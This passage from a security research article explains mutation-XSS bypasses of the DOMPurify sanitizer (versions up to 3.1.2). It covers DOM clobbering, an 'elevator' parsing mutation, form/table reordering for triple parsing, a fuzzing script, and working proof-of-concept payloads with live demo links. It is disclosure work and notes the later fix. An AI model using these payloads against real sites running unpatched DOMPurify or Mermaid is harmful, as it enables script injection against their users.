depth = f.__depth + 1; // [object HTMLInputElement]1

if (depth >= 255) {
    // This never gets reached.
}
</script>
```

**Fig. 37**: Example of \_\_depth count breaking using "second-order" DOM Clobbering.

### "Elevator" HTML mutation

At this point, even though we have demonstrated how to break the flattening limitation, it is still not enough as we can't use any HTML integration points, which were mandatory for the [@IcesFont](https://x.com/IcesFont) mutation.

This time, to find a valid mutation that doesn't require any HTML integration points, I decided to take another approach... fuzzing!

```js
<div id="elem"></div>

<script>
    // init
    const tags = ["a", "abbr", "acronym", "address", "area", "article", "aside", "audio", "b", "base", "basefont", "bgsound", "bdi", "bdo", "big", "blink", "blockquote", "body", /*"br"*/, "button", "canvas", "caption", "center", "cite", "code", "col", "colgroup", "content", "data", "datalist", "dd", "decorator", "del", "details", "dfn", "dialog", "dir", "div", "dl", "dt", "element", "em", "fieldset", "figcaption", "figure", "font", "footer", "form", "h1", "h2", "h3", "h4", "h5", "h6", "head", "header", "hgroup", "hr", "html", "i", "img", "input", "ins", "kbd", "label", "legend", "li", "main", "map", "mark", "marquee", "menu", "menuitem", "meter", "nav", "nobr", "ol", "optgroup", "option", "output", "p", "picture", "pre", "progress", "q", "rp", "rt", "ruby", "s", "samp", "section", "select", "shadow", "small", "source", "spacer", "span", "strike", "strong", "style", "sub", "summary", "sup", "table", "tbody", "td", "template", "textarea", "tfoot", "th", "thead", "time", "tr", "track", "tt", "u", "ul", "var", "video", "wbr", "svg", "altglyph", "altglyphdef", "altglyphitem", "animatecolor", "animatemotion", "animatetransform", "circle", "clippath", "defs", "desc", "ellipse", "filter", "g", "glyph", "glyphref", "hkern", "image", "line", "lineargradient", "marker", "mask", "metadata", "mpath", "path", "pattern", "polygon", "polyline", "radialgradient", "rect", "stop", "switch", "symbol", "text", "textpath", "title", "tref", "tspan", "view", "vkern", "feBlend", "feColorMatrix", "feComponentTransfer", "feComposite", "feConvolveMatrix", "feDiffuseLighting", "feDisplacementMap", "feDistantLight", "feDropShadow", "feFlood", "feFuncA", "feFuncB", "feFuncG", "feFuncR", "feGaussianBlur", "feImage", "feMerge", "feMergeNode", "feMorphology", "feOffset", "fePointLight", "feSpecularLighting", "feSpotLight", "feTile", "feTurbulence", "animate", "color-profile", "cursor", "discard", "font-face", "font-face-format", "font-face-name", "font-face-src", "font-face-uri", "foreignobject", "hatch", "hatchpath", "mesh", "meshgradient", "meshpatch", "meshrow", "missing-glyph", "script", "set", "solidcolor", "unknown", "use", "math", "menclose", "merror", "mfenced", "mfrac", "mglyph", "mi", "mlabeledtr", "mmultiscripts", "mn", "mo", "mover", "mpadded", "mphantom", "mroot", "mrow", "ms", "mspace", "msqrt", "mstyle", "msub", "msup", "msubsup", "mtable", "mtd", "mtext", "mtr", "munder", "munderover", "mprescripts", "maction", "maligngroup", "malignmark", "mlongdiv", "mscarries", "mscarry", "msgroup", "mstack", "msline", "msrow", "semantics", "annotation", "annotation-xml", "none", "#text", "a2", "applet", "audio2", "command", "custom tags", "embed", "frame", "frameset", "iframe", "iframe2", "input2", "input3", "input4", "keygen", "link", "listing", "meta", "multicol", "nextid", "noembed", "noframes", "noscript", "object", "param", "plaintext", "rb", "rtc", "slot", "video2", "xmp"]

    // check for mutations
    var found = []
    var parse = (str) => (new DOMParser).parseFromString(str, "text/html").documentElement.innerHTML;
    var check = (output, payload) => {
        if (/* INSERT SOME CONDITION HERE */) {
            console.log(output);
        }
    }

    // fuzzing context
    var fuzz = () => {
        for (i in tags) {
            for (j in tags) {
                for (k in tags) {
                    payload = `<${tags[i]}><${tags[j]}><${tags[k]}></${tags[k]}></${tags[j]}><style></style></${tags[i]}>`;
                    check(parse(payload), payload);
    }}}}

    // start fuzzing
    fuzz();
</script>
```

**Fig. 38**: Example of a script to fuzz HTML mutation.

I'll be honest, my fuzzing approach wasn't optimized at all. I was only looking for any HTML parsing that resulted in popping out a <style> element using a custom JS script. At least, thanks to this, I found an interesting mutation:

Dom-Explorer

<x><y><z><button><z><button></button></z></button><style></style></z></y></x>​

html

### Dom Tree

<BODY

>

xhtml

<X

>

xhtml

#text

```

```

<Y

>

xhtml

#text

```

```

<Z

>

xhtml

#text

```

```

<BUTTON

>

xhtml

#text

```

```

<Z

>

xhtml

#text

```

```

<BUTTON

>

xhtml

#text

```

```

#text

```

```

<STYLE

>

xhtml

#text

```

```

#text

```

```

**Fig. 39**: "Elevator" HTML mutation example 1.

Dom-Explorer

<x><y><z><button><x><button></button></x></button><style></style></z></y></x>​

html

### Dom Tree

<BODY

>

xhtml

<X

>

xhtml

#text

```

```

<Y

>

xhtml

#text

```

```

<Z

>

xhtml

#text

```

```

<BUTTON

>

xhtml

#text

```

```

<X

>

xhtml

#text

```

```

<BUTTON

>

xhtml

#text

```

```

#text

```

```

<STYLE

>

xhtml

#text

```

```

**Fig. 40**: "Elevator" HTML mutation example 2.

_Take care about the <style> tag :D_

_The <button> tags can be replaced by <dd>, <dt>, <li> or <table>._

Essentially, the tags between two <button> elements determine where the stack of open elements gets popped down. What makes this behavior even more interesting is that it can even traverse namespaces as long as one tag from each traversed namespace is present between the two <button> elements.

Dom-Explorer

<x><math><y><mi><svg><z><title><button><x><button></button></x></button><style></style></title></z></svg></y></math></x>​

html

### Dom Tree

<BODY

>

xhtml

<X

>

xhtml

#text

```

```

<math

>

mathml

<y

>

mathml

<mi

>

mathml

#text

```

```

<svg

>

svg

<z

>

svg

<title

>

svg

#text

```

```

<BUTTON

>

xhtml

#text

```

```

<X

>

xhtml

#text

```

```

<BUTTON

>

xhtml

#text

```

```

<STYLE

>

xhtml

#text

```

```

#text

```

```

#text

```

```

**Fig. 41**: Example of "elevator" mutation without a tag from each namespace to traverse.

Dom-Explorer

<x><math><y><mi><svg><z><title><button><x><y><z><button></button></z></y></x></button><style></style></title></z></svg></y></math></x>​

html

### Dom Tree

<BODY

>

xhtml

<X

>

xhtml

#text

```

```

<math

>

mathml

<y

>

mathml

<mi

>

mathml

#text

```

```

<svg

>

svg

<z

>

svg

<title

>

svg

#text

```

```

<BUTTON

>

xhtml

#text

```

```

<X

>

xhtml

<Y

>

xhtml

<Z

>

xhtml

#text

```

```

<BUTTON

>

xhtml

#text

```

```

#text

```

```

<STYLE

>

xhtml

#text

```

```

**Fig. 42**: Example of "elevator" mutation with a tag from each namespace to traverse.

I tried to figure out where in the specification this behavior was described, and it seems to be related to this:

![](https://mizu.re/articles/articles/vuln06_dompurify/article01/images/html-spec-stack-of-open-elements-2.png)

**Fig. 43**: HTML Specification - Has an element in the specific scope ( [ref](https://html.spec.whatwg.org/#has-an-element-in-the-specific-scope))

Even if this mutation is quite powerful, it wasn't enough to bypass DOMPurify <= 3.1.2 for two reasons:

1. It is required to use the same tag in SVG and HTML namespaces.
2. It is not possible to use HTML integration points.

```js
const COMMON_SVG_AND_HTML_ELEMENTS = addToSet({}, [\
    'title',\
    'style',\
    'font',\
    'a',\
    'script',\
]);
```

**Fig. 44**: List of tags allowed in both the HTML and SVG namespace by DOMPurify ( [ref](https://github.com/cure53/DOMPurify/blob/5b2e3171e403535656270e3aa1842ff030f136e4/src/purify.js#L653)).

Therefore, after playing a bit with this mutation, I've found another case where it can occur:

Dom-Explorer

<a><svg><image><a><desc><image></image></desc></a><style></style></image></svg></a>​

html

### Dom Tree

<BODY

>

xhtml

<A

>

xhtml

#text

```

```

<svg

>

svg

#text

```

```

<image

>

svg

#text

```

```

<a

>

svg

#text

```

```

<desc

>

svg

#text

```

```

<IMG

>

xhtml

#text

```

```

#text

```

```

<STYLE

>

xhtml

#text

```

```

**Fig. 45**: "Elevator" HTML mutation using the <image> tag conversion to <img>.

_You can try to update the <image> tag with an <img> tag in the HTML namespace, you should see that it doesn't work anymore._

As we can see, the <image> tag conversion to <img> in the HTML namespace leads to the same behavior if there is another <image> tag in the SVG namespace subtree. Additionally, thanks to the <a> tag, which is allowed in both SVG and HTML namespaces by DOMPurify, it is possible to trigger the bug properly!

> What makes this mutation more interesting than the <button> one for a DOMPurify bypass?

Basically, DOMPurify blocks the usage of HTML integration points only if it is used to switch from the SVG to HTML namespace. For instance, the following is fully valid and won't be removed.

Dom-Explorer

<svg><desc><svg><image>​

html

### Dom Tree

<BODY

>

xhtml

<svg

>

svg

<desc

>

svg

<svg

>

svg

<image

>

svg

**Fig. 46**: Example of HTML integration points usage without switching to HTML with DOMPurify.

Based on this, we can use node flattening to flatten the <image> tag out of the <svg>, which will create the right combination for DOMPurify sanitizing!

### Proof Of Concept

If we bring everything that has been explained in this section together, it is possible to craft the following HTML bypass which bypasses DOMPurify version <= 3.1.2 ️‍🔥

_Unfortunately, for an unknown reason, second-order DOM clobbering isn't working on Firefox in the context of DOMPurify sanitization, making Firefox not vulnerable again..._

[![](https://mizu.re/articles/articles/vuln06_dompurify/article01/images/dompurify-3.1.2-bypass.png)](https://yeswehack.github.io/Dom-Explorer/dom-explorer/frame/?input=editable&titleBar=readonly&readonly=true&pipe[titleBar]=true&pipe[settings]=true&pipe[render]=true&pipe[skip]=true/#eyJpbnB1dCI6Ijxmb3JtIGlkPVwieCBcIj5cbjxyKjUwND5cbjxhPlxuICA8c3ZnPlxuICAgIDxpbWFnZT5cbiAgICAgIDxhPlxuICAgICAgICA8ZGVzYz5cbiAgICAgICAgICA8c3ZnPlxuICAgICAgICAgICAgPGltYWdlPjwvaW1hZ2U+XG4gICAgICAgICAgPC9zdmc+XG4gICAgICAgIDwvZGVzYz5cbiAgICAgIDwvYT5cbiAgICA8L2ltYWdlPlxuICAgIDxzdHlsZT48YSBpZD1cIjwvc3R5bGU+PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPlwiPjwvYT48L3N0eWxlPlxuICA8L3N2Zz5cbjwvYT5cbjwvZm9ybT5cbjxpbnB1dCBmb3JtPVwieFwiIG5hbWU9XCJfX2RlcHRoXCI+IiwicGlwZWxpbmVzIjpbeyJpZCI6IjAyMmQ4cHpuIiwibmFtZSI6IkRvbSBUcmVlIiwicGlwZXMiOlt7Im5hbWUiOiJEb21QdXJpZnkiLCJpZCI6Inlld2Y2ZXRyIiwiaGlkZSI6dHJ1ZSwic2tpcCI6ZmFsc2UsIm9wdHMiOnsidmVyc2lvbiI6IjMuMS4yIiwib3B0aW9ucyI6Int9In19LHsibmFtZSI6IkRvbVBhcnNlciIsImlkIjoiOXByM2xzbGUiLCJoaWRlIjpmYWxzZSwic2tpcCI6ZmFsc2UsIm9wdHMiOnsidHlwZSI6InRleHQvaHRtbCIsInNlbGVjdG9yIjoiYm9keSIsIm91dHB1dCI6ImlubmVySFRNTCIsImFkZERvY3R5cGUiOnRydWV9fV19XX0=)

**Fig. 47**: DOMPurify <= 3.1.2 bypass.

## 👨‍👩‍👧 DOMPurify Triple HTML Parsing bypass (found with @hash\_kitten and @ryotkak 🔥)

### Form reordering and node flattening

Now that we've covered full bypasses for versions <= 3.1.2, we are going to focus on something a bit different that we have found with [@ryotkak](https://x.com/ryotkak) and [@hash\_kitten](https://x.com/hash_kitten).

One of the main problems of most DOMPurify bypasses is that if the HTML gets parsed (server-side or client-side) at least once before reaching the DOMPurify sink, the payload will be broken as the mutation occurs only in a two-parsing window. I've even seen some applications using DOMPurify twice in a row "just in case". An example that I've faced recently is in the [Mermaid](https://github.com/mermaid-js/mermaid) library:

```js
export const sanitizeText = (text: string, config: MermaidConfig): string => {
  if (!text) {
    return text;
  }
  if (config.dompurifyConfig) {
    text = DOMPurify.sanitize(sanitizeMore(text, config), config.dompurifyConfig).toString(); // sanitizeMore uses DOMPurify.sanitize internaly.
  } else {
    text = DOMPurify.sanitize(sanitizeMore(text, config), { // sanitizeMore uses DOMPurify.sanitize internaly.
      FORBID_TAGS: ['style'],
    }).toString();
  }
  return text;
};
```

**Fig. 48**: [Mermaid.js](https://github.com/mermaid-js/mermaid)'s [sanitizeText](https://github.com/mermaid-js/mermaid/blob/d16e46a3860bce8c4ae1d12308c5d9cf8055bcf7/packages/mermaid/src/diagrams/common/common.ts#L87) function.

One way to overcome that, which we found, is by mixing <form> / <table> reordering and node flattening again. How? For this, we need to "chain" several mutations.

The first one is related to how nested form parsing reacts if a <table>, <marquee>, <applet>, or <object> is present between them. Under those conditions, tags at the same level as the first <form> tag get bumped into it.

Dom-Explorer

<form><table><form></form></table></form><div></div>​

html

### Dom Tree

DomParser

<BODY

>

xhtml

<FORM

>

xhtml

#text

```

```

<TABLE

>

xhtml

#text

```

```

#text

```

```

<DIV

>

xhtml

**Fig. 49**: <form> / <table> reordering

On Firefox, chaining it with the nested <form> mutation, this is enough to trigger a triple parsing mutation bug that bumps up an element. However, this is not the case on Chromium and Safari. I thought this might be related to HTML quirks mode, but I was wrong, and I have no idea where this parsing difference comes from. ¯\\\_(ツ)\_/¯

[![](https://mizu.re/articles/articles/vuln06_dompurify/article01/images/firefox-triple-form-table-reordering-parsing.png)](https://yeswehack.github.io/Dom-Explorer/dom-explorer/frame/?input=editable&titleBar=readonly&readonly=true&pipe[titleBar]=true&pipe[settings]=true&pipe[render]=true&pipe[skip]=true/#eyJpbnB1dCI6Ijxmb3JtPjx0YWJsZT48L2Zvcm0+PGZvcm0+PC90YWJsZT48L2Zvcm0+PGRpdj48L2Rpdj4iLCJwaXBlbGluZXMiOlt7ImlkIjoibHRjNndrY3QiLCJuYW1lIjoiRG9tIFRyZWUiLCJwaXBlcyI6W3sibmFtZSI6IkRvbVBhcnNlciIsImlkIjoiN2wwNjZ6cXgiLCJoaWRlIjpmYWxzZSwic2tpcCI6ZmFsc2UsIm9wdHMiOnsidHlwZSI6InRleHQvaHRtbCIsInNlbGVjdG9yIjoiYm9keSIsIm91dHB1dCI6ImlubmVySFRNTCIsImFkZERvY3R5cGUiOnRydWV9fV19XX0=)

**Fig. 50**: Firefox <form> / <table> reordering (triple HTML parsing).

[![](https://mizu.re/articles/articles/vuln06_dompurify/article01/images/chromium-triple-form-table-reordering-parsing.png)](https://yeswehack.github.io/Dom-Explorer/dom-explorer/frame/?input=editable&titleBar=readonly&readonly=true&pipe[titleBar]=true&pipe[settings]=true&pipe[render]=true&pipe[skip]=true/#eyJpbnB1dCI6Ijxmb3JtPjx0YWJsZT48L2Zvcm0+PGZvcm0+PC90YWJsZT48L2Zvcm0+PGRpdj48L2Rpdj4iLCJwaXBlbGluZXMiOlt7ImlkIjoibHRjNndrY3QiLCJuYW1lIjoiRG9tIFRyZWUiLCJwaXBlcyI6W3sibmFtZSI6IkRvbVBhcnNlciIsImlkIjoiN2wwNjZ6cXgiLCJoaWRlIjpmYWxzZSwic2tpcCI6ZmFsc2UsIm9wdHMiOnsidHlwZSI6InRleHQvaHRtbCIsInNlbGVjdG9yIjoiYm9keSIsIm91dHB1dCI6ImlubmVySFRNTCIsImFkZERvY3R5cGUiOnRydWV9fV19XX0=)

**Fig. 51**: Chromium <form> / <table> reordering (triple HTML parsing).

Therefore, after some fuzzing, [@ryotkak](https://x.com/ryotkak) and [@hash\_kitten](https://x.com/hash_kitten) found that mixing the mutation and adding any tag before the <table> one allows the behavior to work on both Firefox, Chromium and Safari.

Dom-Explorer

<form><x></form><table><form></form></table></x></form><div>​

html

### Dom Tree

DomParser

<BODY

>

xhtml

<FORM

>

xhtml

<X

>

xhtml

<TABLE

>

xhtml

<FORM

>

xhtml

<DIV

>

xhtml

DomParser

<BODY

>

xhtml

<FORM

>

xhtml

<X

>

xhtml

<TABLE

>

xhtml

<DIV

>

xhtml

**Fig. 52**: <form> / <table> reordering (triple HTML parsing) working on Firefox, Chromium and Safari.

Using this, it is possible to control how much an element gets bumped up by simply repeating the payload several times in a row :D

Dom-Explorer

<form><h1></form><table><form></form></table></form></table></h1></form><form><h1></form><table><form></form></table></form></table></h1></form><div>Payload</div>​

html

### Dom Tree

DomParser

<BODY

>

xhtml

<FORM

>

xhtml

<H1

>

xhtml

<TABLE

>

xhtml

<FORM

>

xhtml

#text

```

```

<FORM

>

xhtml

<H1

>

xhtml

<TABLE

>

xhtml

<FORM

>

xhtml

#text

```

```

<DIV

>

xhtml

#text

```
Payload
```

DomParser

<BODY

>

xhtml

<FORM

>

xhtml

<H1

>

xhtml

<TABLE

>

xhtml

#text

```

```

<FORM

>

xhtml

<H1

>

xhtml

<TABLE

>

xhtml

#text

```

```

<DIV

>

xhtml

#text

```
Payload
```

**Fig. 53**: Example of two-level bumped <div> tag using <form> / <table> reordering.

_Don't forgot that the <table> tag can be replaced with <marquee>, <applet> or <object>._

The last thing to do is to craft a payload that reaches the node flattening only on the second parsing, forcing the XSS mutation to occur on the third one!

### Proof Of Concept

If we bring everything that has been explained in this section together, it is possible to craft the following HTML payload, which bypasses DOMPurify version <= 3.1.2 in the case of triple HTML parsing ️‍🔥

_This time it works on Firefox!_

[Live Proof of Concept](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%20src%3D%22https%3A%2F%2Fcdnjs.cloudflare.com%2Fajax%2Flibs%2Fdompurify%2F3.1.2%2Fpurify.min.js%22%20integrity%3D%22sha512-Qv%2FFE%2F4VEODlbctXAQe4OHnXmoHiiMitTJv6D%2F80eCQRviSGZENG4bSOSZ0eE%2B%2BlRkyuxMxID0Dh90gPkq39Pg%3D%3D%22%20crossorigin%3D%22anonymous%22%20referrerpolicy%3D%22no-referrer%22%3E%3C%2Fscript%3E%0A%3Cscript%3E%0Avar%20n%20%3D%20510%3B%0Avar%20payload%20%3D%20%60%0A%24%7B%22%3Cform%3E%3Ch1%3E%3C%2Fform%3E%3Ctable%3E%3Cform%3E%3C%2Fform%3E%3C%2Ftable%3E%3C%2Fform%3E%3C%2Ftable%3E%3C%2Fh1%3E%3C%2Fform%3E%22.repeat%28n%29%7D%0A%3Cmath%3E%0A%20%20%20%20%3Cmi%3E%0A%20%20%20%20%20%20%20%20%3Cstyle%3E%3C%21--%3C%2Fstyle%3E%0A%20%20%20%20%20%20%20%20%3Cstyle%20id%3D%22--%3E%3C%2Fstyle%3E%3C%2Fmi%3E%3C%2Fmath%3E%3Cimg%20src%3D%27x%27%20onerror%3D%27alert%281%29%27%3E%22%3E%3C%2Fstyle%3E%0A%20%20%20%20%3C%2Fmi%3E%0A%3C%2Fmath%3E%0A%60%3B%0Adocument.body.innerHTML%20%3D%20DOMPurify.sanitize%28payload%29%0Adocument.body.innerHTML%20%3D%20document.body.innerHTML%3B%0A%3C%2Fscript%3E&context=html)

```js
var n = 510;
var payload = `
${"<form><h1></form><table><form></form></table></form></table></h1></form>".repeat(n)}
<math>
    <mi>
        <style><!--</style>
        <style id="--></style></mi></math><img src='x' onerror='alert(1)'>"></style>
    </mi>
</math>
`;
document.body.innerHTML = DOMPurify.sanitize(payload)
document.body.innerHTML = document.body.innerHTML;
```

**Fig. 54**: DOMPurify <= 3.1.2 triple HTML parsing bypass example 1.

The previous payload shows the case where the third HTML parsing occurs after the DOMPurify sanitization. Therefore, as we discussed earlier, this can be used in the case of pre-HTML parsing (client-side or server-side) before the DOMPurify sanitization. If we mix this payload with the DOMPurify <= 3.1.2 bypass, it is possible to have a working payload in most cases!

[Live Proof of Concept](https://portswigger-labs.net/xss/xss.php?x=%3Cscript%20src%3D%22https%3A%2F%2Fcdnjs.cloudflare.com%2Fajax%2Flibs%2Fdompurify%2F3.1.0%2Fpurify.min.js%22%3E%3C%2Fscript%3E%0A%3Cscript%3E%0Avar%20n%20%3D%20505%3B%0Avar%20dirty%20%3D%20%60%0A%24%7B%22%3Cform%3E%3Ch1%3E%3C%2Fform%3E%3Ctable%3E%3Cform%3E%3C%2Fform%3E%3C%2Ftable%3E%3C%2Fform%3E%3C%2Ftable%3E%3C%2Fh1%3E%3C%2Fform%3E%5Cn%22.repeat%28n%29%7D%0A%3Ca%3E%0A%20%20%3Csvg%3E%0A%20%20%20%20%3Cimage%3E%0A%20%20%20%20%20%20%3Ca%3E%0A%20%20%20%20%20%20%20%20%3Cdesc%3E%0A%20%20%20%20%20%20%20%20%20%20%3Csvg%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cimage%3E%3C%2Fimage%3E%0A%20%20%20%20%20%20%20%20%20%20%3C%2Fsvg%3E%0A%20%20%20%20%20%20%20%20%3C%2Fdesc%3E%0A%20%20%20%20%20%20%3C%2Fa%3E%0A%20%20%20%20%3C%2Fimage%3E%0A%20%20%20%20%3Cstyle%3E%3Ca%20id%3D%22%3C%2Fstyle%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%22%3E%3C%2Fa%3E%3C%2Fstyle%3E%0A%20%20%3C%2Fsvg%3E%0A%3C%2Fa%3E%0A%60%3B%0Avar%20step1%20%3D%20DOMPurify.sanitize%28dirty%29%3B%0Adocument.body.innerHTML%20%3D%20DOMPurify.sanitize%28step1%29%3B%0A%3C%2Fscript%3E&context=html)

```js
var n = 503;
var dirty = `
${"<form><h1></form><table><form></form></table></form></table></h1></form>\n".repeat(n)}
<a>
    <svg>
        <desc>
            <svg>
                <image>
                    <a>
                        <desc>
                            <svg>
                                <image></image>
                            </svg>
                        </desc>
                    </a>
                </image>
                <title><a id="</title><img src=x onerror=alert(1)>"></a></title>
            </svg>
        </desc>
    </svg>
</a>
`;
var step1 = DOMPurify.sanitize(dirty);
document.body.innerHTML = DOMPurify.sanitize(step1);
```

**Fig. 55**: DOMPurify <= 3.1.0 triple HTML parsing bypass example 2.

_A double DOMPurify.sanitize has been used for the showcase, I believe it shows how strong this payload is! :D_

Oh, and this works perfectly on outdated [mermaid.js](https://github.com/mermaid-js/mermaid) versions, but I leave it as an exercise :p

## ➡️ What's next?

### DOMPurify 3.1.2 fix

Because of the triple HTML parsing bypass, [@cure53berlin](https://x.com/cure53berlin) decided to fix the problem at its root cause: HTML attributes. Since all the recent DOMPurify bypasses involve namespace confusion attacks using HTML attributes to smuggle an HTML comment, they decided to remove any attribute containing this pattern. Thanks to this mitigation, even an n-time HTML parsing mutation will be detected and sanitized from the first parsing by DOMPurify.

![](https://mizu.re/articles/articles/vuln06_dompurify/article01/images/dompurify-3.1.3-fix.png)

**Fig. 58**: Fig. 30: GitHub diff between DOMPurify versions 3.1.3 and 3.1.2 ( [ref](https://github.com/cure53/DOMPurify/compare/3.1.2...3.1.3)).

### Conclusion

To conclude, this article has covered four DOMPurify bypasses: three related to the default configurations for versions <= 3.1.0, 3.1.1, and 3.1.2, and one based on triple HTML parsing payloads. We've seen that HTML can be highly unpredictable, with many specific behaviors such as node flattening, insertion modes, and the stack of open elements capable of generating various mutations that lead to unexpected results.

Moreover, while the latest DOMPurify fix is robust, it also means that the library's security now relies heavily on a single regular expression. In the second article, we will explore how and why this reliance can become problematic in certain configurations and use cases :D

Finally, I would like to thank [@IcesFont](https://x.com/IcesFont), [@hash\_kitten](https://x.com/hash_kitten), and [@ryotkak](https://x.com/ryotkak) for allowing me to write about all the findings. Additionally, I want to extend my gratitude to [@cure53berlin](https://x.com/cure53berlin) for their incredible responsiveness to each report ❤️

DOMPurify is an amazing library; keep using it!

[\> Click here to continue with Part 2.](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations)

## 📚 Bibliography

- cure53. DOMPurify. [https://github.com/cure53/DOMPurify](https://github.com/cure53/DOMPurify)
- @gregxsunday. $3,133.70 XSS in golang's net/html library - My first Google bug bounty. [https://www.youtube.com/watch?v=H1TVk3HhL9E](https://www.youtube.com/watch?v=H1TVk3HhL9E)
- WhatWG. HTML specification - Serialising html fragments. [https://html.spec.whatwg.org/#serialising-html-fragments](https://html.spec.whatwg.org/#serialising-html-fragments)
- @SecurityMB. Mutation XSS via namespace confusion - DOMPurify < 2.0.17 bypass. [https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/](https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/)
- @BitK\_. DOM Explorer. [https://yeswehack.github.io/Dom-Explorer/](https://yeswehack.github.io/Dom-Explorer/)
- WhatWG. HTML specification. [https://html.spec.whatwg.org/](https://html.spec.whatwg.org/)
- WhatWG. HTML namespace. [https://html.spec.whatwg.org](https://html.spec.whatwg.org/)
- W3.org. SVG namespace. [https://www.w3.org/TR/SVG2/](https://www.w3.org/TR/SVG2/)
- W3.org. MathML namespace. [https://www.w3.org/TR/MathML/chapter2.xml](https://www.w3.org/TR/MathML/chapter2.xml)
- WhatWG. HTML specification - HTML integration points. [https://html.spec.whatwg.org/#html-integration-point](https://html.spec.whatwg.org/#html-integration-point)
- WhatWG. HTML specification - MathML text integration points. [https://html.spec.whatwg.org/#html-integration-point](https://html.spec.whatwg.org/#html-integration-point)
- WhatWG. HTML Specification - Tree construction. [https://html.spec.whatwg.org/#tree-construction](https://html.spec.whatwg.org/#tree-construction)
- WhatWG. HTML Specification - HTML insertion modes. [https://html.spec.whatwg.org/#the-insertion-mode](https://html.spec.whatwg.org/#the-insertion-mode)
- WhatWG. HTML Specification - stack of open elements. [https://html.spec.whatwg.org/#the-stack-of-open-elements](https://html.spec.whatwg.org/#the-stack-of-open-elements)
- WhatWG. HTML Specification - in caption insertion mode. [https://html.spec.whatwg.org/#parsing-main-incaption](https://html.spec.whatwg.org/#parsing-main-incaption)
- WhatWG. HTML Specification - Has an element in the specific scope. [https://html.spec.whatwg.org/#has-an-element-in-the-specific-scope](https://html.spec.whatwg.org/#has-an-element-in-the-specific-scope)
- Mermaid. Mermaid.js. [https://github.com/mermaid-js/mermaid](https://github.com/mermaid-js/mermaid)

[_keyboard\_arrow\_left_ Exploring the DOMPurify library: Hunting for Misconfigurations (2/2)](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations)

[HeroCTF v6 Writeups _keyboard\_arrow\_right_](https://mizu.re/post/heroctf-v6-writeups)